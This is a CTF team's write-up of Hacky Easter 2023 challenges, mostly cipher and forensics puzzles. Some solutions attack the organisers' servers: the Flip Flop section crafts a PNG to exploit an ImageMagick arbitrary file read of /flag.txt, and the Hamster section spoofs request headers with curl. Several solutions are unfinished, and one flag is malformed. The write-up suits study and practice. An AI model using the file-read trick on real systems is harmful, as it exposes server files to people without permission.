# HackyEaster 2022

The annual Easter CTF from Hacking-lab

![](writeupfiles/teaser_banner.jpg)


## Overview

Title                                            | Points     | Egg
-------------------------------------------------| ---------- | ------------------------------
Level 1: Welcome                                 |            |
[Sanity Check](#sanity-check)                    | Level 1    | `he2023{just_A_sanity_chEck}`
Level 2: Noob Zone                               |            |
[Word Cloud](#word-cloud)                        | Level 2    | `he2023{this_is_the_flag!}`
[Rotation](#roation)                             | Level 2    | `he2023{0n3_c4n_r34d_r0t0r_b4ckw4rds}`
[Birds on a Wire](#birds-on-a-wire)              | Level 2    | `he2023{birdwatchingisfun}`
[Bins](#bins)                                    | Level 2    | `he2023{}`
Level 3: It's so Easy                            |            |
[Chemical Code](#chemical-code)                  | Level 3    | `he2023{flagenergyatomcosmos}`
[Serving Things](#serving-things)                | Level 3    | `he2023{}`
[Cut Off](#cut-off)                              | Level 3    | `he2023{4cr0pa_wh4t?}`
[Global Egg Delivery](#global-egg-delivery)      | Level 3    | `he2023{u7ƒ_b0m5s_8rᗱ_n07_8ㅣway5_1gn0rᗱd}`
Level 4: Quattuor                                |            |
[Flip Flop](#flip-flop)                          | Level 4    | `he2023{1m4g3-tr4g1cK-aga111n}`
[Bouncy not in the Castle](#bouncy-not-in-the-castle)| Level 4| `he2023{}`
[A Mysterious Parchement](#a-mysterious-parchment)| Level 4   | `he2023{BUTISITACOOLOLDCODEITSUREIS}`
[Hamster](#Hamster)                              | Level 4    | `he2023{s1mpl3_h34d3r_t4mp3r1ng}`
[Lost in (French) Space](#lost-in-french-space)  | Level 4    | `he2023{davies}`
[Spy Tricks](#spy-tricks)                        | Level 4    | `he2023{I_like_303_b3tter_but_thats_n0t_pr1me}`
Level 5                                          |            |
[Thumper's PWN - Ring 3](#thumpers-pwn---ring3)  | Level 5    |
[Ghost in a Shell 4](#ghost-in-a-shell-4)        | Level 5    | `he{2023{al1asses-4-fUn-and-pr0fit}`
[Going Round](#going-round)                      | Level 5    |
[Numbers Station](#numbers-station)              | Level 5    |
[Igor's Gory Passwordsafe](#igors-gory-passwordsafe)| Level 5  |
[Singular](#singular)                            | Level 5    |


## Level 1: Welcome

### Sanity Check

**Challenge**

This is your first flag!

Right here --> `he2023{             }`

🚩 Flags are in format `he2023{...}`, unless noted otherwise. Always check additional information given (uppercase, lowercase, spaces, etc.).

**Solution**

inspecting the empty looking space in the challenge text, we see

```html
<span style="color: black; background-color: black; opacity: 0;">just_A_sanity_chEck</span>
```

**Egg**

```
he2023{just_A_sanity_chEck}
```

## Level 2: Noob Zone


### Word Cloud

**Challenge**

I like Word Clouds, what about you?

Download the image below (he2023-wordcloud.jpg), sharpen your eyes, and find the right flag.


![](writeupfiles/he2023-wordcloud.jpg)

**Solution**

The wordcloud contains a lot of false flags, but also the correct one, so just read all the words until you find it!

![](writeupfiles/he2023-wordcloud-solution.jpg)

**Egg**

```
he2023{this_is_the_flag!}
```

### Rotation

**Challenge**

My new rotor messed up the flag!

```
96a_abL_?b04c?0Cbc50C_E_C03c4<HcC5DN
```

I tried to decode it, but it didn't work. The rotor must have been too fast!

**Solution**

We suspect a rotation cipher because of the cipher, and assuming the given string starts with `he2023`, this indeed checks out (`h` and `e` are 3 apart in the ASCII table, so are `9` and `6`). It would appear to be a rotation of 47, though sometimes it is +47, sometimes -47, so we write a short script to find the direction of rotation

```python
import string

ct="96a_abL_?b04c?0Cbc50C_E_C03c4<HcC5DN"
flag = ""

for i in range(0,len(ct)):
  pt = chr ( ord(ct[i])+47 )
  if pt not in string.printable:
     pt = chr ( ord(ct[i])-47 )

  flag += pt

print(flag)
```

which gives us the flag!

**Egg**

```
he2023{0n3_c4n_r34d_r0t0r_b4ckw4rds}
```

### Birds on a Wire

**Challenge**

Just some birds sitting on a wire.

Download the image and find the flag!

![](writeupfiles/birdsonawire.jpg)

**Solution**

Some Googling reveals that this is the ["Birds on a Wire" cipher](https://www.dcode.fr/birds-on-a-wire-cipher)

It's a simple substitution cipher so we just map the birds to their corresponding letters to find the flag!

**Egg**

```
he2023{birdwatchingisfun}
```

### Bins

**Challenge**

The rabbits left a mess in their cage.

```
  //    //                    //
 ('>   ('>    LX2gkn81        ('>
 /rr   /rr       carrots      /rr
*\))_ *\))_                  *\))_
```

If only I knew which bin to put the rubbish in.


**Solution**

**Egg**

```
he2023{}
```


## Level 3: It's so Easy

### Chemical Code

**Challenge**

Our crazy chemistry professor wrote a secret code on the blackboard:

```
9 57 32 10 111 39 85 8 115 8 16 42 16
```

He also mumbled something like "essential and elementary knowledge".


**Solution**

This sounds like we have to convert atomic numbers to their corresponding sybols to get the flag

We find a python package to help us, [PyAstronomy](https://pyastronomy.readthedocs.io/en/latest/pyaslDoc/aslDoc/atomicNo.html, )and use it to decode the flag

```python3
from PyAstronomy import pyasl

an = pyasl.AtomicNo()
ct =[9,57,32,10,111,39,85,8,115,8,16,42,16]

flag = "".join(an.getElSymbol(ct[i]) for i in range(0,len(ct)))

print(flag)  # outputs FLaGeNeRgYAtOMcOSMoS

```

**Egg**

```
he2023{flagenergyatomcosmos}
```

### Serving Things

**Challenge**

Get the 🚩 at /flag.

[http://ch.hackyeaster.com:2316]([http://ch.hackyeaster.com:2316)

Note: The service is restarted every hour at x:00.

**Solution**

We get a simle website

```html
<!DOCTYPE html>

<html>
<head>
<title>Serving Things</title>
    <link rel="stylesheet"
	    href="/static/app.css">
	<script	src="/static/jquery-3.6.3.min.js" language="javascript"></script>
    <script	src="/static/app.js" language="javascript"></script>
</head>

<body>
	<div id="menu">
        Get: <a id="quotes" href="#">Quotes</a> | <a id="colors" href="#">Colors</a> | <a id="stars" href="#">Stars</a> |
		<a id="cheese" href="#">Cheese</a> | <a id="wine" href="#">Wine</a> | <a id="meals" href="#">Swiss Meals</a> |
		<a id="trek" href="#">The Trek</a> | <a id="flag" href="#">Flag</a>
	</div>
	<div id="text">
	</div>
	<div id="footer">
		<div id="created">
			Created by inik / 2023
		</div>
	</div>
</body>
</html>
```

with `app.js`:

```javascript
function get(url) {
    u = encodeURI(window.location.protocol + "//" + window.location.host + "/get?url=" + url);
    $.get(u, function (data) {
        var color = Math.floor(Math.random() * 16777215).toString(16);
        $("#text").fadeOut(400);
        setTimeout(function () {
            $("#text").html(data);
            $("#text").css("color", "#" + color);
            $("#text").fadeIn(400);
        }, 400);
    });
}

$(document).ready(function () {
    $("#quotes").click(function () {
        get("http://quotes:1337/quote");
    })

    $("#colors").click(function () {
        get("http://colors:1337/color");
    })

    $("#stars").click(function () {
        get("http://stars:1337/star");
    })

    $("#cheese").click(function () {
        get("http://cheese:1337/cheese");
    })

    $("#flag").click(function () {
        get("http://flags:1337/flag");
    })

    $("#wine").click(function () {
        get("http://wine:1337/wine");
    })

    $("#meals").click(function () {
        get("http://meals:1337/meal");
    })

    $("#trek").click(function () {
        get("http://trek:1337/trek");
    })

    $('#quotes').trigger('click');
});
```

So there are a couple of words you can click on, which get

```
http://ch.hackyeaster.com:2316/get?url=http://flags:1337/flag
```

returns

```
Thank you hacker! But our flag is in another castle! ~ Bugs Bunny
```

hmm..

**Egg**

```
he2023{}
```


### Cut Off

**Challenge**

I had a secret Easter egg on my screenshot, but I cropped it, hehe!

Kudos to former Hacky Easter winner Retr0id - he's one of the researches who found the vulnerability in question!

![](writeupfiles/screenshot.png)

**Solution**

This sounds like the recen [aCROPalypse vulnerability](https://en.wikipedia.org/wiki/ACropalypse).

We use [acropalypse.app](https://acropalypse.app/) to recover the cropped part of the image.

We try some phone models until we have success with the "Google Pixel 6" setting

![](writeupfiles/screenshot-recovered.png)

we than scan the QR code to get the flag

```bash
$ zbarimg screenshot-recovered.png
QR-Code:he2023{4cr0pa_wh4t?}
scanned 1 barcode symbols from 1 images in 0.24 seconds

```

**Egg**

```
he2023{4cr0pa_wh4t?}
```


### Global Egg Delivery

**Challenge**

Thumper has taken great strides with the digitization of the business of distributing eggs and assorted goodies. Globalizing such a service is not without its pains and requires the additional effort to account for local customs.

Now Thumper has his message all prepared, fed through a block-chain enabled, micro-service driven, AI enhanced, zero trust translation service all that comes back is this...

Can you help Thumper decode the message?

[message.txt](writeupfiles/message.txt)

**Solution**

By `cat`ing message.txt to the terminal we see:


Looking at the bytes,

```
$ cat message.txt | od -tx2 -a
0000000    feff    0068    fffe    6500    feff    0032    fffe    3000
        del   ~   h nul   ~ del nul   e del   ~   2 nul   ~ del nul   0
0000020    feff    0032    fffe    3300    feff    007b    fffe    7500
        del   ~   2 nul   ~ del nul   3 del   ~   { nul   ~ del nul   u
0000040    feff    0037    fffe    9201    feff    005f    fffe    6200
        del   ~   7 nul   ~ del soh dc2 del   ~   _ nul   ~ del nul   b
0000060    feff    0030    fffe    6d00    feff    0035    fffe    7300
        del   ~   0 nul   ~ del nul   m del   ~   5 nul   ~ del nul   s
0000100    feff    005f    fffe    3800    feff    0072    fffe    f115
        del   ~   _ nul   ~ del nul   8 del   ~   r nul   ~ del nak   q
0000120    feff    005f    fffe    6e00    feff    0030    fffe    3700
        del   ~   _ nul   ~ del nul   n del   ~   0 nul   ~ del nul   7
0000140    feff    005f    fffe    3800    feff    3163    fffe    7700
        del   ~   _ nul   ~ del nul   8 del   ~   c   1   ~ del nul   w
0000160    feff    0061    fffe    7900    feff    0035    fffe    5f00
        del   ~   a nul   ~ del nul   y del   ~   5 nul   ~ del nul   _
0000200    feff    0031    fffe    6700    feff    006e    fffe    3000
        del   ~   1 nul   ~ del nul   g del   ~   n nul   ~ del nul   0
0000220    feff    0072    fffe    f115    feff    0064    fffe    7d00
        del   ~   r nul   ~ del nak   q del   ~   d nul   ~ del nul   }
0000240
```

`0xfeff` and `0xffe` are [Unicode BOMs](https://en.wikipedia.org/wiki/Byte_order_mark). (Namely they should appear ONLY at the start)

> The BOM character is, simply, the Unicode codepoint U+FEFF ZERO WIDTH NO-BREAK SPACE, encoded in the current encoding. Traditionally, this codepoint is just a zero-width non-breaking space that inhibits line-breaking between word-glyphs. As such, if the BOM character appears in the middle of a data stream, Unicode says it should be interpreted as a normal codepoint, not as a BOM. Since Unicode 3.2, this usage has been deprecated in favor of U+2060 WORD JOINER.[1] - https://en.wikipedia.org/wiki/Byte_order_mark


So this is ,, incredibly invalid utf16. Fun! We can decode this manually by regexing the above into something like:

```
printf '\xfe\xff\x00\x68\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x65\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x32\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x30\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x32\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x33\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x7b\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x75\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x37\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x92\x01\x00' | iconv -f utf-16 -t utf-8 | uniname
```

And then seeing the result

```
16:55:38|(main) [user@p:~/projects/ctf-writeups-galaxians/HackyEaster_2023]$ bash message.sh 2>/dev/null | grep 0
        0          0  000068   68             h      LATIN SMALL LETTER H
        0          0  000065   65             e      LATIN SMALL LETTER E
        0          0  000032   32             2      DIGIT TWO
        0          0  000030   30             0      DIGIT ZERO
        0          0  000032   32             2      DIGIT TWO
        0          0  000033   33             3      DIGIT THREE
        0          0  00007B   7B             {      LEFT CURLY BRACKET
        0          0  000075   75             u      LATIN SMALL LETTER U
        0          0  000037   37             7      DIGIT SEVEN
        0          0  000192   C6 92          ƒ      LATIN SMALL LETTER F WITH HOOK
        0          0  00005F   5F             _      LOW LINE
        0          0  000062   62             b      LATIN SMALL LETTER B
        0          0  000030   30             0      DIGIT ZERO
        0          0  00006D   6D             m      LATIN SMALL LETTER M
        0          0  000035   35             5      DIGIT FIVE
        0          0  000073   73             s      LATIN SMALL LETTER S
        0          0  00005F   5F             _      LOW LINE
        0          0  000038   38             8      DIGIT EIGHT
        0          0  000072   72             r      LATIN SMALL LETTER R
        0          0  0015F1   E1 97 B1       ᗱ      CANADIAN SYLLABICS CARRIER GE
```

Pulling out that middle column manually (sorry) we get the flag:


**Egg**

```
he2023{u7ƒ_b0m5s_8rᗱ_n07_8ㅣway5_1gn0rᗱd}
```



## Level 4: Quattuor

### Flip Flop

**Challenge**

This awesome service can flipflop an image!

Flag is located at: `/flag.txt`

http://ch.hackyeaster.com:2310

**Solution**

We get a service that will take an image we supply it, and return it to us flipped upside down. The hint says it uses imagemagick to do this.

This looks like an imagemagick vulnerability, and we find a useful [article](https://www.uptycs.com/blog/denial-of-servicedos-and-arbitrary-file-read-vulnerability-in-imagemagick)
on the topic that we can follow.

So we use pngcrush to generate our image (the `test.png` input image can be any png image you have lying around)

```bash
$ pngcrush -text a Profile /flag.txt test.png
```

This creates an output image in [pngout.png](), and we can check the metadata is set correctly:

```bash
$ exiftool pngout.png
ExifTool Version Number         : 12.40
File Name                       : pngout.png
Directory                       : .
File Size                       : 2.3 MiB
File Modification Date/Time     : 2023:04:10 19:47:32+02:00

[..]

History When                    : 2023:01:30 11:31:54+01:00
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Profile                         : /flag.txt
Image Size                      : 2732x1810
Megapixels                      : 4.9
```

We upload this to our server, and get an image back, [pngreturned.png](writeupfiles/pngreturned.png)

Frustratingly, `exiftool` doesn't show us the `Raw profile type` metadata tag with the flag in it, but using the `exiv2` tool does:

```bash
$ exiv2 -pS pngreturned.png                                                                                                                            [10-04-23 19:59:30]
STRUCTURE OF PNG FILE: pngreturned.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | ............                   | 0x6e9bc480
      33 | iCCP  |     371 | icc..(.u..+DQ..?fh.G....%...5. | 0x09d9776f
     416 | cHRM  |      32 | ..z&..............u0...`..:..  | 0x9cba513c
     460 | bKGD  |       6 | ......                         | 0xa0bda793
     478 | pHYs  |       9 | .........                      | 0x952b0e1b
     499 | tIME  |       7 | ...../'                        | 0xf75a837f
     518 | tEXt  |      94 | Raw profile type txt..txt.     | 0x633ed62f
     624 | IDAT  |   32768 | x....w\..'.m{\..... A&.$..n... | 0xadc05540
   33404 | IDAT  |   32768 | ?33Q..~..g.o..B......9g\....Z+ | 0x807f9e28
   66184 | IDAT  |   32768 | ...5595==.8....B.A..N..3 D.l6. | 0x82fb6bd5
   98964 | IDAT  |   32768 | .a..=55}... 0...j,.-b....R.@." | 0x586f7028
  131744 | IDAT  |   32768 | z*.9..Z.s....@))%...,.9.@J. .. | 0x7fd64b40
  164524 | IDAT  |   32768 | ..Z........R.....(......f.`... | 0x73e7d6f7

[..]
```

opening in a hexeditor helps

![](writeupfiles/flipflophex.png)

```
6865323032337b316d3467332d7472346731634b2d6167613131316e7d
```

Hey, this looks like plausible hex-encoded ASCII text, let's decode!

**Egg**

```
he2023{1m4g3-tr4g1cK-aga111n}
```

### Bouncy not in the Castle

**Challenge**

**Solution**

**Egg**

```
he2023{}
```

### A Mysterious Parchment

**Challenge**

On their holiday, the bunnies came across a sleepy village with an interesting tower. While enjoying the view, one of them found a crumpled parchment in a corner. "Hah, that's clever!", the bunnies agreed after quickly solving the code and altered it ever so slightly.

![](writeupfiles/parchment.png)

**Solution**

The challenge said the bunnies altered the parchment slightly, so let's find the original so we can compare.

Some Googling tells us this is parchment of Bérenger Saunière, found in the Church of Mary Magdalene at Rennes-le-Château by Bérenger Saunière.
It is said that these documents led to the discovery of the famed treasure of Rennes-le-Château.

Coded messages were later found by historian Henry Lincoln. 

![](writeupfiles/parchment-original.jpg)

I noticed that some of the letter were moved up compared to the original, so this must be the bunnies code. I simply onderlined all the higher letters and read off the flag

![](writeupfiles/parchment-solved.png)

its spells out `but is it a cool old parchment it sure is`. The instructions say the flag is all uppercase and no spaces, so we know our flag

**Egg**

```
he2023{BUTISITACOOLOLDCODEITSUREIS}
```

### Hamster

**Challenge**

The Hamster has a flag for you.

http://ch.hackyeaster.com:2301

Note: The service is restarted every hour at x:00.

**Solution**

we visit the url and get various responsed of how to alter our requests, so we use curl and follow instructions:


```bash
$ curl http://ch.hackyeaster.com:2301
Howdy, I am the hamster.Please go to /feed

# ok, let's go to /feed
$ curl http://ch.hackyeaster.com:2301/feed
only hamster-agent is allowed

# so let's set a user-agent
$ curl -A "hamster-agent"  http://ch.hackyeaster.com:2301/feed
⛳ GET invalid

# maybe POST? PUT? Yes, you want put
$ curl -A "hamster-agent" -X PUT http://ch.hackyeaster.com:2301/feed
🛑 request must come from hackyhamster.org

# ok, let's set a referrer
$ curl -A "hamster-agent" -X PUT -e "hackyhamster.org" http://ch.hackyeaster.com:2301/feed
🍪 brownie not found

# want a cookie? here you go.
$ curl -A "hamster-agent" -X PUT -e "hackyhamster.org" --cookie "brownie=brownie" http://ch.hackyeaster.com:2301/feed
🍪 brownie must be baked

# ok, set the value to baked
$ curl -A "hamster-agent" -X PUT -e "hackyhamster.org" --cookie "brownie=baked" http://ch.hackyeaster.com:2301/feed
🚩 he2023{s1mpl3_h34d3r_t4mp3r1ng}

#whoo, we got it!
```



**Egg**

```
he2023{s1mpl3_h34d3r_t4mp3r1ng}
```

### Lost in (French) Space

**Challenge**

My friend went to France and sent me coordinates of interesting things he found.

Three of them look legit, but one does not make sense to me.

```
48.998 2.008
45.960 0.090
43.579 1.524
45.007 4.335
```

🚩 Flag

- the first word of the thing you find
- six lowercase letters
- wrapped in flag format, e.g. he2023{thingy}


**Solution**

We look up the coordinates in Google Maps, 3 of them are for french observatories, the fourth on (`45.960 0.090`) leads us to an empty field, so that must be the one that doesn't make sense.

```
48.998 2.008  # Observatoire de Triel
45.960 0.090  # ??
43.579 1.524  # Le sentier des planètes
45.007 4.335  # Planète Mars Observatoire Hubert Reeves
```

Since the other 3 lead to observatories, what if the coordinates are to another planet? Let's try Mars first since that is part of the name of one of the observatories.

We use NASA's website [Mars Trek](https://trek.nasa.gov/mars/) and go to the coordinates `45.960 0.090`. There is a crater right there! We find it's name is Davies crater.

![](writeupfiles/davies-crater.png)

And that is indeed the flag!

**Egg**

```
he2023{davies}
```

### Spy Tricks

**Challenge**

The bunny spymaster found a tiny note in a forgotten dead drop and is now scratching her head; she's sure she once knew the code, but there are too many swirling aorund in her head right now. Can you help her decipher the message?

```
27231 21597 10016 20971 24727 24414 22223 25666 20345 26292
26605 23788 20345 26292 21597 10016 27857 24727 26605 10016
24727 24414 10016 20345 10016 25979 20345 21910 21597 10016
20345 25666 25666 22849 26918 20345 23788 14398 10016 27231
21597 10016 20971 24727 24414 21910 22849 25666 24101 10016
26292 22536 21597 10016 25666 21597 20971 21597 22849 25040
26292 10016 24727 21910 10016 27857 24727 26605 25666 10016
23788 21597 26292 26292 21597 25666 10016 26292 24727 10016
26292 22536 21597 10016 20345 21284 21284 25666 21597 25979
25979 10016 26918 10016 25666 21597 25040 21597 20345 26292
10016 26918 10016 20345 24414 21284 10016 26292 22536 21597
10016 25666 21597 20345 21284 22849 24414 22223 10016 24727
21910 10016 23788 21597 26292 26292 21597 25666 10016 24414
26605 24101 20658 21597 25666 10016 15337 14398 03130 32552
31613 15650 15024 15650 15963 38499 22849 29735 33804 32865
33491 31613 29735 15963 15024 15963 29735 30674 15963 36308
36308 31613 35682 29735 30674 36621 36308 29735 36308 32552
30361 36308 35995 29735 34430 15024 36308 29735 35056 35682
15337 34117 31613 39125 03130 26292 22536 21597 10016 25040
20345 20971 23475 20345 22223 21597 10016 27231 20345 25979
10016 21284 21597 23788 22849 26918 21597 25666 21597 21284
10016 26292 24727 10016 27857 24727 26605 25666 10016 27231
22849 21910 21597 10016 25040 21597 25666 25979 24727 24414
20345 23788 23788 27857 14398 10016 21597 26918 21597 25666
27857 26292 22536 22849 24414 22223 10016 22849 25979 10016
20345 23788 23788 10016 25666 22849 22223 22536 26292 10016
27231 22849 26292 22536 10016 26292 22536 21597 10016 21910
20345 24101 22849 23788 27857 14398 10016 27231 21597 10016
27231 22849 25979 22536 10016 27857 24727 26605 10016 25979
26605 20971 20971 21597 25979 25979 14398 10016 22223 25666
21597 21597 26292 22849 24414 22223 25979 10016 21910 25666
24727 24101 10016 26292 22536 21597 10016 20971 24727 24101
25666 20345 21284 21597 25979 14398 10016 24414 26605 24101
20658 21597 25666 10016 15337 13772 10016 15963 25666 21284
10016 24727 21910 10016 21284 21597 20971 21597 24101 20658
21597 25666 14398 03130
```

**Solution**

We applied random characters to this and put it through a cryptogram solver which go us .. quite close

```
WESCONGRATULATESYOUSONSASBAFESARRISALYSWESCONFIRMSTHESRECEIPTSOFSYOURSLETTERSTOSTHESADDREBBSSSREPEATSSSANDSTHESREADINGSOFSLETTERSNUMVERSJYUAXQZQXMIZDVCXZXZXZQXKKXHZQLKZKAJKIZFZKZGHJEXNUTHESPACKAGESWABSDELISEREDSTOSYOURSWIFESPERBONALLYYS
```

and then took that into python where we made more progress with a 52 character subtitution alphabet:

```
we congratulate you on a safe arrival. we confirm the receipt of your letter to the address v repeat v and the reading of letter number 1.
HE2023{i_LIKE_303_D3SSEQ_DRS_SHCSP_O0S_NQ1ME}
the package was delivered to your wife personally. everything is all right with the family. we wish you success. greetings from the comrades. number 1: 3rd of december.
```

Saskia eventually got this into

```
HE2023{i_LIKE_303_B3TTER_BUT_THATS_N0T_PR1ME}
```

Which we tried, and then tried lower case which wasn't right (:eyes:)

So we tried doing it their way which was clearly intended and did a common factor finder and oh whoopsie it was actually really simple:

```python
data = open('intercepted_message.txt', 'r').read().replace('\n', ' ').split(' ')
data = map(int, data[0:-1])
print(''.join([chr(x // 313) for x in data]))
```

and wow that was really simple, we just forgot to also capitalise the I when we uncapitalised the rest:

**Egg**

```
he2023{I_like_303_b3tter_but_thats_n0t_pr1me}
```



## Level 5

### Thumper's PWN - Ring 3

**Challenge**

Thumper has been hunting his nemesis, Dr. Evil, for months. He finally located his remote system and is trying to gain access. Can you help him find the right password?

Target: `nc ch.hackyeaster.com 2313`

**Solution**

**Egg**

```
he2023{}
```


### Ghost in a Shell 4

**Challenge**

```
  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    , ,   ,
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     | \   /
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  \ /
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~   ~
______________________________________________________________________
 ,--.     ,--.     ,--.     ,--.
| oo |   | oo |   | oo |   | oo |
| ~~ |   | ~~ |   | ~~ |   | ~~ |  o  o  o  o  o  o  o  o  o  o  o  o
|/\/\|   |/\/\|   |/\/\|   |/\/\|
______________________________________________________________________
```

Connect to the server, snoop around, and find the flag!

- ssh `ch.hackyeaster.com -p 2306 -l blinky`
- password is: `blinkblink`


**Solution**

Let's log in and see what we have:

```bash
$ ssh ch.hackyeaster.com -p 2306 -l blinky
blinky@ch.hackyeaster.com's password:

  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    , ,   ,
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     | \   /
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  \ /
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~   ~
______________________________________________________________________
 ,--.     ,--.     ,--.     ,--.
| oo |   | oo |   | oo |   | oo |
| ~~ |   | ~~ |   | ~~ |   | ~~ |  o  o  o  o  o  o  o  o  o  o  o  o
|/\/\|   |/\/\|   |/\/\|   |/\/\|
______________________________________________________________________

Find the flag!
ab81e1e4280b:~$ ls
about.txt
blinky
flag.txt
ab81e1e4280b:~$ cat flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ less flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ more flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ ls -la
about.txt
blinky
flag.txt
```

ok, a bunch of commands are acting weird, let's see if they setup some aliases to make our lives difficult.. yep!

```bash
$ alias
alias ash='exit'
alias bash='echo "you are not a bash brother" && exit'
alias cat='echo "|\---/|" && echo "| o_o |  meow!" && echo " \___/" #'
alias cd='/bin/true'
alias egrep='echo "" #'
alias fgrep='echo "" #'
alias find='echo "command not found: find" #'
alias fzip='/usr/bin/zip -P "/bin/funzip"'
alias grep='echo "" #'
alias id='echo "uid=0(root) gid=0(root) groups=0(root)"'
alias java='echo "command not found: java" #'
alias less='echo "|\---/|" && echo "| o_o |  meow!" && echo " \___/" #'
alias ls='/bin/ls /home/blinky | /bin/grep -v home #'
alias more='echo "|\---/|" && echo "| o_o |  meow!" && echo " \___/" #'
alias pwd='echo /home/blinky #'
alias python='echo "command not found: python" #'
alias vi='echo "command not found: vi" #'
alias vim='echo "command not found: vim" #'
alias whoami='echo "you are you"'
alias zip='echo "command not found: zip" #'
alias zsh='exit'
```

to fix this we do

```
$ unalias sh
$ sh
```

to get a clean shell

```bash
ab81e1e4280b:~$ unalias sh
ab81e1e4280b:~$ sh
b81e1e4280b:~$ cat about.txt
Blinky, ankaŭ konata kiel Akabei, estas la gvidanto de la Fantomoj kaj la ĉefmalamiko de Pac-Man. Li ankaŭ estas prezentita kiel la plej agresema fantomo kiu ĉiam postkuras Pac-Man, kaj malfacilas skui post kiam li komencas. Li povas havi humoron, kaj estas bonaj amikoj kun Pinky, Inky, kaj Clyde. Li ankaŭ havas filinon nomitan Yum-Yum.

Dum origine la ĉefantagonisto en la unua Pac-Man arkadludo, lia antagonisma rolo de la franĉizo estis plejparte malpliigita al aliancano en lastatempaj enkarniĝoj, kvankam li daŭre estas konsiderita la serio-fakta ĉefa antagonisto en refilmigoj de la unua matĉo kaj de pli maljunaj adorantoj.

ab81e1e4280b:~$ cat flag.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀don't try⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀- brute force⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀- wordlists⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
